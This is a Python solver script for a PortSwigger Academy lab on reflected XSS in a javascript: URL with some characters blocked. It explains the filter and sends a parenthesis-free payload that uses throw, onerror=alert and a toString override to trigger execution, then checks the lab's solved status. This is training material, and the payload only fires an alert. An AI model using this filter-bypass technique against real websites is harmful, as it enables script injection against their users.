#!/usr/bin/env python3
"""Automated solver: PortSwigger "Reflected XSS in a JavaScript URL with some
characters blocked" (EXPERT).

Vulnerability
-------------
Every blog post ends with a "Back to Blog" link that is generated from the
current query string:

    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>

The whole query string — including any extra parameter an attacker appends — is
spliced into the single-quoted ``body:'...'`` JavaScript string.  The app tries
to defend itself by filtering characters on the way in:

* percent-decoded, then re-encoded for the JS string: ``' " < > & = : ; ?``
* silently **deleted**: ``( ) [ ] % ` `` and spaces

That is a string-context filter, not a JavaScript filter: the payload only has
to avoid the deleted characters, and the surviving ``'`` closes the string.
Because the ``javascript:`` URL is percent-decoded by the browser *before*
evaluation, the app's own escaping of ``'`` and ``>`` is harmless — it hands
execution back to the attacker verbatim.

The documented exploit escapes the string and the options object, passes extra
arguments to ``fetch``, and abuses implicit string conversion:

    fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(...)

``throw`` is a statement, so it is wrapped in an arrow function, that function
is assigned to ``window.toString``, and ``window + ''`` forces the conversion,
which throws and reaches ``onerror = alert``.  ``/**/`` replaces the blocked
space.  ``alert`` receives a message containing ``1337``.

What the solver does
--------------------
1. Fetches the lab root, verifies the page title, records the authoritative
   ``widgetcontainer-lab-status`` baseline and discovers a real post id from the
   blog listing (no hardcoded postId).
2. Fetches that post and reads the generated ``javascript:fetch(...)`` link,
   proving the query string is reflected into the JS string and deriving the
   injection point from the live markup.
3. Sends a control request whose payload uses a blocked character (``(``) and
   asserts the filter really deletes it — the precondition that makes the
   comment-based, parenthesis-free payload necessary.
4. Sends the exploit request and asserts the reflected ``javascript:`` URL
   percent-decodes back to syntactically intact code containing
   ``throw/**/onerror=alert,1337``.
5. Polls the lab root until the status widget flips to ``is-solved`` /
   ``Solved`` (this lab is checked server-side, so no victim delivery is
   needed), then reports request count and wall-clock time.

Nothing instance-specific is hardcoded: host, post id and the reflected prefix
come from ``--url`` and the live response.  ``--show-url`` prints the crafted
URL without sending it, so the alert can be confirmed manually in a browser.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --show-url
    uv run python solve.py --url "<url>" --wait 30 --verbose

Exit codes: 0 verified solved, 1 exploit sent but lab not marked solved,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import re
import sys
import time
import urllib.parse

import httpx

LAB_TITLE = "reflected xss in a javascript url with some characters blocked"
UA = "Mozilla/5.0 (PortSwigger javascript-URL XSS solver)"

# The documented vector from the Academy solution.  It contains no space,
# no ( ) [ ] % or backtick, which is exactly the set the lab deletes.
INJECTION = "'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'"
MARKER = "throw/**/onerror=alert,1337"

TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-solved\b", re.I)
POST_ID_RE = re.compile(r"/post\?postId=(\d+)")
LINKBACK_RE = re.compile(
    r"<div class=\"is-linkback\">\s*<a href=\"([^\"]+)\"", re.I)


def normalize(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", " ", text.lower()).strip()


class Solver:
    def __init__(self, url: str, *, timeout: float, wait: float,
                 verbose: bool) -> None:
        self.base = url.rstrip("/")
        self.timeout = timeout
        self.wait = wait
        self.verbose = verbose
        self.requests = 0
        self.t0 = time.time()
        self.post_id = ""
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": UA},
        )

    # -- plumbing ---------------------------------------------------------- #
    def get(self, path: str) -> httpx.Response:
        self.requests += 1
        r = self.client.get(self.base + path)
        if self.verbose:
            print(f"    GET {r.url} -> {r.status_code}", flush=True)
        return r

    def log(self, msg: str) -> None:
        print(f"[{time.time() - self.t0:6.1f}s] {msg}", flush=True)

    # -- state ------------------------------------------------------------- #
    @staticmethod
    def is_solved(html: str) -> bool:
        """Authoritative check: the lab header widget class for solved state."""
        return bool(SOLVED_RE.search(html)) and "<p>Solved</p>" in html

    @staticmethod
    def linkback(href: str) -> str:
        return urllib.parse.unquote(href)

    # -- phases ------------------------------------------------------------ #
    def identify(self) -> str:
        r = self.get("/")
        m = TITLE_RE.search(r.text)
        title = re.sub(r"\s+", " ", m.group(1)).strip() if m else "(no title)"
        self.log(f"lab title       : {title} (HTTP {r.status_code})")
        if normalize(LAB_TITLE) not in normalize(title):
            raise SystemExit(
                f"error: this does not look like the expected lab "
                f"({LAB_TITLE!r}): {title!r}")
        ids = POST_ID_RE.findall(r.text)
        if not ids:
            raise SystemExit("error: no /post?postId=N links found on the home page")
        return r.text

    def baseline(self, home_html: str) -> bool:
        solved = self.is_solved(home_html)
        self.log(f"baseline status : {'SOLVED (already)' if solved else 'not solved'}")
        return solved

    def discover_reflection(self) -> tuple[str, str]:
        """Pick a post and read its reflected javascript: back-link."""
        home = self.get("/").text
        ids = POST_ID_RE.findall(home)
        self.post_id = ids[0]
        r = self.get(f"/post?postId={self.post_id}")
        m = LINKBACK_RE.search(r.text)
        if not m:
            raise SystemExit("error: no 'Back to Blog' link found on the post page")
        href = m.group(1)
        decoded = self.linkback(href)
        self.log(f"post id         : {self.post_id}")
        self.log(f"reflected href  : {decoded}")
        if not href.startswith("javascript:fetch("):
            raise SystemExit(f"error: unexpected back-link ({href[:80]!r})")
        expected_body = f"body:'/post%3fpostId%3d{self.post_id}"
        if expected_body not in href:
            raise SystemExit(
                "error: the query string is not spliced into the fetch() body "
                f"as expected (href={href[:120]!r})")
        return href, decoded

    def control(self) -> None:
        """The lab really deletes ( ) [ ] % and spaces -> proof the filter exists."""
        r = self.get(f"/post?postId={self.post_id}&AL(1)[2]%3b")
        if r.status_code != 200:
            raise SystemExit(f"error: control request returned HTTP {r.status_code}")
        m = LINKBACK_RE.search(r.text)
        href = m.group(1) if m else ""
        decoded = self.linkback(href)
        filtered = "AL12;" in decoded and "AL(1)" not in decoded
        self.log(f"control         : '(' ')' '[' ']' deleted by filter = "
                 f"{'yes' if filtered else 'NO'} "
                 f"({decoded.split('postId=' + self.post_id, 1)[-1][:40]!r})")
        if not filtered:
            raise SystemExit(
                "error: the character filter is not behaving as this lab "
                "requires; the payload would need a different shape")

    def build_url(self) -> str:
        # Raw characters only; the app encodes what it wants to escape and the
        # browser percent-decodes the javascript: URL before evaluation.
        return f"{self.base}/post?postId={self.post_id}&{INJECTION}"

    def exploit(self, *, send: bool = True) -> str:
        url = self.build_url()
        if not send:
            return url
        self.requests += 1
        r = self.client.get(url)
        if self.verbose:
            print(f"    GET {r.url} -> {r.status_code}", flush=True)
        if r.status_code != 200:
            raise SystemExit(f"error: exploit request returned HTTP {r.status_code}")
        m = LINKBACK_RE.search(r.text)
        if not m:
            raise SystemExit("error: exploit response has no 'Back to Blog' link")
        decoded = self.linkback(m.group(1))
        self.log(f"injected href   : {decoded}")
        if MARKER not in decoded:
            print("    href was:", decoded, flush=True)
            raise SystemExit(
                "error: the injected code did not survive the filter intact")
        if "onerror=alert,1337" not in decoded:
            raise SystemExit("error: the onerror=alert,1337 assignment was mangled")
        self.log("injection       : survives filter, decodes to intact JS "
                 "(alert(1337) fires when 'Back to Blog' is clicked)")
        return decoded

    def wait_solved(self) -> bool:
        deadline = time.time() + self.wait
        while True:
            r = self.get("/")
            if self.is_solved(r.text):
                return True
            if time.time() >= deadline:
                return False
            time.sleep(1.0)

    # -- driver ------------------------------------------------------------ #
    def run(self, *, show_url: bool = False) -> int:
        home = self.identify()
        already = self.baseline(home)
        self.discover_reflection()
        self.control()
        if show_url:
            print()
            print("crafted URL (open in a browser, then click 'Back to Blog'):")
            print(self.build_url())
            print()
            return 0
        self.exploit()
        solved = self.wait_solved()
        elapsed = time.time() - self.t0

        print()
        print("=" * 66)
        print(f"lab status      : {'SOLVED' if solved else 'NOT SOLVED'}")
        print(f"caused by solver: {'no (was already solved)' if already else ('yes' if solved else 'n/a')}")
        print(f"HTTP requests   : {self.requests}")
        print(f"elapsed         : {elapsed:.1f}s")
        print("=" * 66)
        if solved:
            print("evidence        : lab header widget reports is-solved / 'Solved'; "
                  "the exploit response's javascript: back-link contains "
                  "throw/**/onerror=alert,1337 after percent-decoding.")
            return 0
        print("error: the lab did not report solved state; evidence kept above.")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve the PortSwigger 'Reflected XSS in a JavaScript URL "
                    "with some characters blocked' lab (EXPERT).")
    ap.add_argument("--url", required=True, help="Lab base URL")
    ap.add_argument("--timeout", type=float, default=20.0,
                    help="Per-request timeout in seconds (default 20)")
    ap.add_argument("--wait", type=float, default=15.0,
                    help="Seconds to poll for solved state after the exploit (default 15)")
    ap.add_argument("--show-url", action="store_true",
                    help="Print the crafted URL and exit without sending it")
    ap.add_argument("--verbose", action="store_true", help="Log every request URL")
    args = ap.parse_args()

    if not re.match(r"^https?://[^/\s]+", args.url):
        print(f"error: --url must be an http(s) lab URL, got {args.url!r}",
              file=sys.stderr)
        return 2

    solver = Solver(args.url, timeout=args.timeout, wait=args.wait,
                    verbose=args.verbose)
    try:
        return solver.run(show_url=args.show_url)
    except httpx.HTTPError as e:
        print(f"error: lab unreachable/expired: {e}", file=sys.stderr)
        return 3
    finally:
        solver.client.close()


if __name__ == "__main__":
    sys.exit(main())
